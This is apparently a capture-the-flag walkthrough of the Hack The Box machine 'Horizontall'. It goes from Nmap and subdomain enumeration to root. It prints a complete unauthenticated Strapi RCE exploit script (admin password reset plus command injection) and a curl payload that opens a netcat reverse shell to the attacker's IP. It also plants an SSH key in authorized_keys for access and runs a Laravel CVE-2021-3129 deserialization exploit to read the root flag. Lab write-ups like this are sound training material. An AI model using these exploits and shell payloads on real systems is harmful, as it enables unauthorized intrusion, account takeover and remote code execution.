# Machine name - Horizontal 

## Nmap resutls

```
# Nmap 7.91 scan initiated Wed Sep  8 15:57:00 2021 as: nmap -sC -sV -oN nmap 10.10.11.105
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.29s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  8 15:58:43 2021 -- 1 IP address (1 host up) scanned in 103.25 seconds
                 
```

### So we are having web server running on port 80

# lets add the ip in the /etc/hosts 
```
10.10.11.105	horizontal.htb 
```
## Running gobuster on the ip
```
We didnt find anything usefull
```
## Using gobuster for finding subdomain, and here we find an interesting subdomain 
```
gobuster dns -d horizontall.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
```
# Subdomain we got
```
api-prod.horizontal.htb
```

## To access this domain we have to add this to /etc/hosts
```
10.10.11.105    horizontal.htb api-prod.horizontal.htb
```

## Running gobuster on api-prod.horizontal.htb
```
/reviews              (Status: 200) [Size: 507]
/users                (Status: 403) [Size: 60]
/admin                (Status: 200) [Size: 854]
/Reviews              (Status: 200) [Size: 507]
/Users                (Status: 403) [Size: 60]
```

### Found Some interesting directories, and also find a login page 
![login page](https://github.com/sigwotts/HTB-Walkthrough/blob/main/Horizontal/Main%20page.png)

## After some research we managed to find the version of strapi 
```
Strapi version 3.0.0-beta.17.7
```

## The version of strapi is having 
```
# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 2021-08-30
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://strapi.io/
# Software Link: https://strapi.io/
# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
# Tested on: Ubuntu 20.04
# CVE : CVE-2019-18818, CVE-2019-19609

#!/usr/bin/env python3

import requests
import json
from cmd import Cmd
import sys


if len(sys.argv) != 2:
    print("[-] Wrong number of arguments provided")
    print("[*] Usage: python3 exploit.py <URL>\n")
    sys.exit()


class Terminal(Cmd):
    prompt = "$> "
    def default(self, args):
        code_exec(args)

def check_version():
    global url
    print("[+] Checking Strapi CMS Version running")
    version = requests.get(f"{url}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]
    if version == "3.0.0-beta.17.4":
        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
    else:
        print("[-] Version mismatch trying the exploit anyway")


def password_reset():
    global url, jwt
    session = requests.session()
    params = {"code" : {"$gt":0},
            "password" : "SuperStrongPassword1",
            "passwordConfirmation" : "SuperStrongPassword1"
            }
    output = session.post(f"{url}/admin/auth/reset-password", json = params).text
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessfull\n[-] Exiting now\n\n")
        sys.exit(1)
    else:
        print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")
def code_exec(cmd):
    global jwt, url
    print("[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don't expect to see output")
    headers = {"Authorization" : f"Bearer {jwt}"}
    data = {"plugin" : f"documentation && $({cmd})",
            "port" : "1337"}
    out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
    print(out.text)

if __name__ == ("__main__"):
    url = sys.argv[1]
    if url.endswith("/"):
        url = url[:-1]
    check_version()
    password_reset()
    terminal = Terminal()
    terminal.cmdloop()


```
### By saving this file as exploit.py we run this expoit to get the username , password and JSON Web Token 
```
python3 exploit.py http://api-prod.horizontall.htb/ 
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMxMzAyODExLCJleHAiOjE2MzM4OTQ4MTF9._P5JRoW0OpW0jNNgkxgU-krUzt5oq40hso6PKVvJZQE

```
## By using these creds and JSON Token we managed to login through the portal (using burp) 
![Admin page](https://github.com/sigwotts/HTB-Walkthrough/blob/main/Horizontal/adminpage%20after%20login.png)

## Now we set up a netcat listner
```
nc -lnvp 4444
```

## This script does not gives us the shell so by getting the reverse shell we use curl 
```
curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMxMzAyODExLCJleHAiOjE2MzM4OTQ4MTF9._P5JRoW0OpW0jNNgkxgU-krUzt5oq40hso6PKVvJZQE' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14157. 4444 >/tmp/f)\",\"port\":\"80\"}' $'http://api-prod.horizontall.htb/admin/plugins/install'

```
#BOOOOOOOOOOOOOOMMMMMMMMMMM!!!!!!!!!!!! We got a shell

## Here we got our user flag 
```
cat /home/developer/user.txt
```

# User flag
```
3d6982b2cdb88c1e96aa678929ce1327
```

# Its time for Privilege escalation

### Lets upload linpeas on the server 

### To do this Start an python http server on your machine 
```
sudo python3 -m http.server 8080 
```
## We upload linpeas on the server by using the cmd
```
wget http://<IP>:8080/linpeas.sh
```

## Then by giving linpeas executable permissions
```
chmod +x linpeas.sh
./linpeas.sh
```

## linpeas tells us it is having Larvel v8(PHP v7.4.18) on port 8000, We have to port forward this to our machine and for this we have to generate a pair of ssh keys 
```
ssh-keygen
```
## After the key is generated turn on a netcat listner on your machine
```
nc -lnvp 3333 < /home/kali/.ssh/id_rsa.pub
```
## On the victim machine
```
nc -nv 10.10.14.157 3333 > authorized_keys
```
## Put your IP here

## Then the key will transfer into the /opt/strapi/.ssh/authorized_keys

## Once this is complete, you can access it by using
```
ssh -i ~/.ssh/id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb 
```
## Now we are strapi 
```
$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
```

## Now its time to get the root flag by exploiting it by using exploit
```
https://github.com/nth347/CVE-2021-3129_exploit
```

## Usage of the exploit
```
$ git clone https://github.com/nth347/CVE-2021-3129_exploit.git
$ cd CVE-2021-3129_exploit
$ chmod +x exploit.py
$ ./exploit.py http://localhost:8000 Monolog/RCE1 id
```

## From this we got the id, and by obtaining the root flag we have to modify the cmd a little bit
```
sudo ./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt" 
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Cloning into 'phpggc'...
remote: Enumerating objects: 2587, done.
remote: Counting objects: 100% (929/929), done.
remote: Compressing objects: 100% (522/522), done.
remote: Total 2587 (delta 374), reused 812 (delta 283), pack-reused 1658
Receiving objects: 100% (2587/2587), 388.83 KiB | 3.06 MiB/s, done.
Resolving deltas: 100% (1016/1016), done.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

454fa3814befe7f4c6f52b06d30ab862

[i] Trying to clear logs
[+] Logs cleared

```

# BOOOMMMMMMMM!!! HERE WE GOT OUR ROOT FLAG 

```
454fa3814befe7f4c6f52b06d30ab862
```
